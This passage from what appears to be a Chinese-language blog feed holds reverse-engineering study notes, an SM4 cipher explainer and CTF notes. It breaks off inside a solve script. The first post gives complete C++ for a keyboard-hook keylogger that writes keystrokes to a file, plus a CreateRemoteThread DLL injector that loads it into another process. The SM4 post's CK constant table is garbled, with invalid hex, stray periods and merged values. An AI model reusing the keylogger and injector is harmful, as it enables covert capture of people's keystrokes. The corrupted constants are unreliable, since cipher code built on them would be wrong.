class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span>* user_dir = <span class="built_in">getenv</span>(<span class="string">&quot;USERPROFILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (user_dir != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="type">char</span> file_path[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">snprintf</span>(file_path, <span class="built_in">sizeof</span>(file_path), <span class="string">&quot;%s\\outputkey.txt&quot;</span>, user_dir);</span><br><span class="line">FILE* fl = <span class="built_in">fopen</span>(file_path, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fl != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">fwrite</span>(str, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(str), fl);</span><br><span class="line"><span class="built_in">fclose</span>(fl);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> ch[<span class="number">15</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (((DWORD)lParam &amp; <span class="number">0x80000000</span>) &amp;&amp; (HC_ACTION == nCode)) &#123;</span><br><span class="line"><span class="keyword">switch</span> (wParam) &#123;</span><br><span class="line"><span class="keyword">case</span> VK_RETURN:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ENTER]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_BACK:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[BCAKSPACE]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_TAB:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[TAB]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_MENU: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ALT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_ESCAPE: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ESC]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DELETE: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[DELETE]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LEFT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[LEFT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_UP: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RIGHT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DOWN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[DOWN]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LWIN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RWIN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F1: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F1]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F2: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F2]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F3: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F3]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F4: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F4]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F5: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F5]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F6: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F6]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F7: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F7]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F8: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F8]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F9: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F9]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F10: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F10]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F11: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F11]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F12: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F12]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">BYTE ks[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">GetKeyboardState</span>(ks);</span><br><span class="line">WORD w;</span><br><span class="line">UINT scan = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ToAscii</span>(wParam, scan, ks, &amp;w, <span class="number">0</span>);</span><br><span class="line">ch[<span class="number">0</span>] = <span class="built_in">char</span>(w);</span><br><span class="line">ch[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">writeToFile</span>(ch);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时dllmain就可以什么都不干了，只用找到当前进程句柄就好</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HMODULE hinstDLL,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  dwReason,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以在固定位置生成文件写入按键了，上面的代码参考了github上的一个项目</p><hr><h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>从外部促使目标进程调用LoadLibrary的API使得执行DLLMain</p><p>书上只写了两种方法，之后有机会试一试反射注入，听说效果更好</p><p>第一种：</p><p>远程线程注入，创建一个远程线程代替原本进程注入进去，</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">_Ret_maybenull_</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>其中第4个参数（如果没有第二个可选参数就是第三个）是线程回调函数地址，当创建好线程后，这个线程就会执行这个函数。其最终的传入参数是CreateRemoteThread的第5个参数，这里它一定是一个指针，所以如果要传入多个参数的话需要一些数据结构，比如数组指针或者结构体指针。</p><p>由于传入参数是一个指针，而一个进程只能访问它拥有的内存空间，所以为了把dll成功注入，需要先把参数写到目标进程的内存中</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Ret_maybenull_</span><br><span class="line">_Post_writable_byte_size_(dwSize)</span><br><span class="line"><span class="function">LPVOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>是用于在目标进程内申请空间并返回对应指针的函数</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Success_(<span class="keyword">return</span> != FALSE)</span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_(nSize) LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ SIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>这个是写入内存的函数，第二个参数是之前申请到的地址，第三个参数是写入的内容。</p><p>然后就可以直接用第二个参数当写入内容的指针了</p><p>inject函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//取得对应PID句柄</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;open %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//申请内存</span></span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="number">0</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;memory alloc failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);<span class="comment">//写入地址</span></span><br><span class="line">HMODULE kernel = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (kernel == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(kernel, <span class="string">&quot;LoadLibraryW&quot;</span>);<span class="comment">//获取LodaLibrary地址</span></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">pBuf,<span class="comment">//传参</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;create hThread failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);<span class="comment">//等待线程结束</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在测试中，得知了x86的进程，那么注入器和dll也要是x86的，x64的也一样</p><p>还没学DLL卸载QAQ</p>]]></content>
    
    
    <summary type="html">好久没有更新了，现在更新一波</summary>
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="学习" scheme="https://www.pri87.vip/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>加密04-SM4</title>
    <link href="https://www.pri87.vip/posts/77e5000d.html"/>
    <id>https://www.pri87.vip/posts/77e5000d.html</id>
    <published>2024-06-05T03:22:04.000Z</published>
    <updated>2024-06-17T16:20:30.399Z</updated>
    
    <content type="html"><![CDATA[<p>好耶，不用介绍了，</p><p><a href="http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html">文档连接</a></p><p>感觉和AES加密差不多</p><h1 id="SM4-SMS4"><a href="#SM4-SMS4" class="headerlink" title="SM4&#x2F;SMS4"></a>SM4&#x2F;SMS4</h1><h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><p>分组算法，分组长度位128位，密钥长度位128位</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>32次迭代</p><p>输入为X0到X4共十六字节，每个X有4字节，通过轮密钥运算生成X0对应的X5……以此类推，直到生成了X32,X33,X34,X35</p><p>具体来说<br>$$<br>X_{i+4}&#x3D;F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i)<br>$$</p><p>其中F为轮函数：<br>$$<br>F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i) &#x3D; X_0\oplus T(X_{i+1}\oplus X_{i+2}\oplus X_{i+3}\oplus rk_i)<br>$$</p><p>其中T为合成置换，$T(x) &#x3D; L(\tau)$，其中L是线性变换，$\tau$是非线性变换</p><p>对于$\tau$,</p><p>把输入的四个值转为hex，查S盒，得到下一个值</p><p><img src="https://s2.loli.net/2024/06/05/ZCGLwJEIuyHD5VO.png" alt="image-20240605162119411"></p><p>得到转化后的4个值记为B</p><p>结果C&#x3D;<br>$$<br>L(B)&#x3D;B\oplus(B&lt;&lt;&lt;2)\oplus(B&lt;&lt;&lt;10)\oplus(B&lt;&lt;&lt;18)\oplus(B&lt;&lt;&lt;24)<br>$$<br>&lt;&lt;&lt;是32位循环左移</p><p>1次反序变换</p><p>将结果变为X35,X34,X33,X32</p><h3 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h3><p>FK系统参数  CK固定参数 MK输入密钥一共4个</p><p>轮密钥由加密密钥生成</p><p>加密密钥K0到K3由$MK_i$和$FK_i$异或得到</p><p>后面的则是$rK_i$&#x3D;<br>$$<br>K_{I+4}&#x3D;K_i \oplus T’(K_{i+1} \oplus K_{i+2} \oplus K_{i+3}\oplus CK_i)<br>$$<br>T’是将T的线性变换L换成下面的L‘：<br>$$<br>L’(B)&#x3D;B\oplus(B&lt;&lt;&lt;13)\oplus(B&lt;&lt;&lt;23)<br>$$</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FK0</span> <span class="operator">=</span> A3B1BAC6</span><br><span class="line"><span class="attribute">FK1</span> <span class="operator">=</span> <span class="number">56</span>AA3350</span><br><span class="line"><span class="attribute">FK2</span> <span class="operator">=</span> <span class="number">677</span>D9197</span><br><span class="line"><span class="attribute">FK3</span> <span class="operator">=</span> B27022DC</span><br></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CK = [<span class="number">00070E15</span>，1C232A31,383F464D,<span class="number">545B6269</span>，<span class="number">70777E85</span>,8C939AA1,A8AFB6BD,C4CBD2D9E0E7EEF5FC030A11,181F262D,<span class="number">343B4249</span>，<span class="number">50575E65</span>，6C737A81,888F969D,A4ABB2B9，C0C7CED5,DCE3EAF1,F8FF060D,<span class="number">141B2229</span>，<span class="number">30373E45</span>,4C535A61，686F767D<span class="number">.848B9299</span>.A0A7AEB5，IBCC3CAD1,D8DFE6ED,F4FB0209<span class="number">.10171E25</span>,2C333A41,484F565D,<span class="number">646B7279</span>]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">SM4基本介绍</summary>
    
    
    
    <category term="密码" scheme="https://www.pri87.vip/categories/%E5%AF%86%E7%A0%81/"/>
    
    
    <category term="分组" scheme="https://www.pri87.vip/tags/%E5%88%86%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>刷题记录（4）</title>
    <link href="https://www.pri87.vip/posts/22913c82.html"/>
    <id>https://www.pri87.vip/posts/22913c82.html</id>
    <published>2024-06-03T14:30:57.000Z</published>
    <updated>2024-06-17T16:20:30.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="litctf"><a href="#litctf" class="headerlink" title="litctf"></a>litctf</h1><h2 id="ezpy"><a href="#ezpy" class="headerlink" title="ezpy"></a>ezpy</h2><p>这个文件一看是python打包的</p><p>然后本身解包很简单，但是找主函数调用的库找不到QAQ</p><p>但是exe可以执行，那么肯定库是在的</p><p>根据<a href="https://blog.csdn.net/as604049322/article/details/119834495">Pyinstaller打包的exe之一键反编译py脚本与防反编译_pyinstaller防止反编译-CSDN博客</a></p><p>查找资料，通过把PYZ-00.pyz打开查看内容找到最后的库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyi-archive_viewer ezpy.exe</span><br><span class="line">o PYZ-00.pyz</span><br></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x xxx.<span class="keyword">lib</span></span><br></pre></td></tr></table></figure><p>然后就和普通的操作一样了</p><h1 id="CISCN"><a href="#CISCN" class="headerlink" title="CISCN"></a>CISCN</h1><h2 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h2><p>这个是arm的汇编，看起来有点难QAQ</p><p>写脚本把代码跑出来又不是很现实</p><p>所以尝试丢给ai，写脚本解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 原始数据</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">__const:0000000100003F10 D7                            unk_100003F10 DCB 0xD7                  ; DATA XREF: _main+34↑o</span></span><br><span class="line"><span class="string">__const:0000000100003F11 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F12 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F13 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F14 B7                            DCB 0xB7</span></span><br><span class="line"><span class="string">__const:0000000100003F15 21                            DCB 0x21 ; !</span></span><br><span class="line"><span class="string">__const:0000000100003F16 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F17 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F18 47                            DCB 0x47 ; G</span></span><br><span class="line"><span 